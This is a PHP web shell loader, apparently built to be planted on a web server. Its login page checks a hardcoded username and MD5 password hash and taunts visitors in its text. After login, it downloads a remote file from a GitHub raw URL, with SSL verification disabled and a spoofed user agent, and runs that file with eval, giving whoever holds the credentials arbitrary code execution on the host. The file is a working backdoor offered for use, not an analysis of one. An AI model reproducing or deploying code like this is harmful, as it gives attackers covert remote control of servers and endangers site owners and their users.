<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['log']) && $_POST['log'] === 'login' && isset($_POST['username']) && isset($_POST['password'])) {
    // Validate username and password here
    // Example validation (replace with your actual validation logic)
    $entered_username = $_POST['username'];
    $entered_password = $_POST['password'];
    $hashed_password = '6d0e93833c03b971e3f192117c3f49cc'; // Replace this with your MD5 hashed password

    if ($entered_username === 'binggo' && md5($entered_password) === $hashed_password) {
        // Username and password are correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Username or password is incorrect
        echo "<p class='error'>Incorrect username or password. Please try again.</p>";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/binggo-02/bingshells/refs/heads/main/leviathanbing.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>LOGIN Dulu Man</title>
        <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Caveat+Brush&display=swap" rel="stylesheet">
        <link rel="shortcut icon" href="https://wallpapercave.com/wp/wp4020127.jpg" type="image/x-icon">
        <style>
    :root {
        --text-color:hsla(125, 95.60%, 44.50%, 0.82);
        --text-red: rgb(255, 255, 255);
        --box-color:rgba(12, 218, 5, 0.53);
        --unactive: hsl(0, 17.90%, 89.00%);
    }

    * {
        margin: 0;
        padding: 0;
    }

    html {
        height: 100vh;
        width: 100%;
    }

    body {
        overflow: hidden;
        background-image: url(https://scontent.fcgk42-1.fna.fbcdn.net/v/t39.30808-6/294676222_341849444830943_6114391288075205837_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=cc71e4&_nc_ohc=J8YzuVf4A9UQ7kNvgFF2UET&_nc_oc=AdjNzxjY6QBdJwBr0cxffU-vwqSbrpWcpOFxPdCLvZvoWh1GzAeEYERSb_Ogv68EcMc&_nc_zt=23&_nc_ht=scontent.fcgk42-1.fna&_nc_gid=Ay_LMqnoXiQuxrtGfu-tqH9&oh=00_AYBZLhqkhntyofzFAu7MGDTPX4fFaygkvNmjFUrkmK7HhQ&oe=67A19C7F);
        background-color: black;
        background-size: cover;
        background-repeat: no-repeat;
        align-items: center;
    }

    .login-form {
        height: 100vh;
        width: 100%;
        position: inherit;
        box-sizing: border-box;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    .logo {
        font-family: 'Creepster', cursive;
        color: var(--text-color);
        font-size: 50px;
    }

    .logo span {
        color: var(--text-red);
    }

    .login-box {
        width: 300px;
        background-color: var(--box-color);
        padding: 40px;
        margin-top: 10px;
        border-radius: 15px;
        box-shadow: 0px 3px 3px 0px rgba(0, 0, 0, 0.12), 0px 3px 6px 0px rgba(0, 0, 0, 0.22), 0px 5px 10px 0px rgba(0, 0, 0, 0.2), 0px 8px 12px 1px rgba(0, 0, 0, 0.19);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    .login-box input {
        margin-top: 20px;
        border-radius: 5px;
        padding: 10px;
        border: 1px solid var(--unactive);
        background-color: var(--box-color);
        outline: none;
        color: var(--text-color);
    }

    .login-box .inputBox {
        position: relative;
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .inputBox span {
        color: var(--unactive);
        top: 20px;
        position: absolute;
        padding: 10px;
        pointer-events: none;
        transition: 300ms;
    }

    .login-box input:valid~span,
    .login-box input:focus~span {
        color: var(--text-color);
        transform: translateX(10px) translateY(-7px);
        font-size: 0.8em;
        padding: 0 10px;
        background: var(--box-color);
    }

    .submit {
        display: flex;
        justify-content: center;
    }

    .error {
        color: var(--text-red);
    }

    .quote {
        color: var(--text-color);
        font-family: 'Caveat Brush';
        font-size: 25px;
    }

    .copyright {
        display: flex;
        justify-content: center;
        margin: 10px;
        font-family: 'caveat Brush';
        color: var(--text-color);
        font-size: 20px;
    }

    .hidden {
        visibility: hidden;
    }

    @media only screen and (max-width: 480px) {
        body {
            background-image: url(https://h.top4top.io/p_3090sctu71.png);
        }

        .login-box {
            width: calc(100vw - 100px);
        }

        .quote {
            font-size: 20px;
        }
    }
</style>
    </head>
    
    <body>
        <div class="login-form">
            <h1 class="logo">LOGIN<span> Dulu Bang</span></h1>
            <div class="login-box">
                <?php
                if (isset($error_message)) {
                    echo "<p class='error'>$error_message</p>";
                }
                ?>
                <p class="quote">haha login first little bastard</p>
                <form method="post">
                    <input type="hidden" name="log" value="login">
                    <div class="inputBox">
                        <input type="text" name="username" required>
                        <span>Username</span>
                    </div>
                    <div class="inputBox">
                        <input type="password" name="password" required>
                        <span>Password</span>
                    </div>
                    <div class="submit">
                        <input type="submit" value="Login">
                    </div>
                </form>
            </div>
            <div class="copyright"><span>Binggo@2025</span></div>
        </div>
    </body>
    
    </html>
    <?php
}
